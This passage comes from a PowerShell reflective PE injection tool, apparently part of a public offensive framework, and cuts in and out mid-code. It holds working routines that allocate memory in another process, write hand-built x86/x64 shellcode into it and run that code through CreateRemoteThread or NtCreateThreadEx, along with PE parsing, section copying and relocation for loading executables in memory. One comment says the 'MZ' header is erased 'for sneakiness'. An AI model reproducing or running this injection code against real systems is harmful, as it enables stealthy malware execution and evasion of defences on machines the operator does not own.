		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Create-RemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			#Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		#XP/Win8
		else
		{
			#Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		#Get NtHeadersInfo
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		#Free the memory allocated above, this isn't where we allocate the PE to memory
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	#PEInfo must contain the following NoteProperties:
	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		#Get NtHeaders information
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		#Build the PEInfo object
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		if ($PEInfo.PE64Bit -eq $true)
		{
			#Allocate memory for the address returned by LoadLibraryA
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		$FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		[IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
        	$FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

		    #Write FunctionName to memory (will be used in GetProcAddress)
		    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RFuncNamePtr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		    if ($Success -eq $false)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($FunctionNameSize -ne $NumBytesWritten)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
		
		#Get address of GetProcAddress
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		#Allocate memory for the address returned by GetProcAddress
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		#Write Shellcode to the remote process which will call GetProcAddress
		#Shellcode: GetProcAddress.asm
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			#Address to copy the section to
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			#    so truncate SizeOfRawData to VirtualSize
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			#If SizeOfBlock == 0, we are done
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			#Loop through each relocation
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				#Get info for this relocation
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
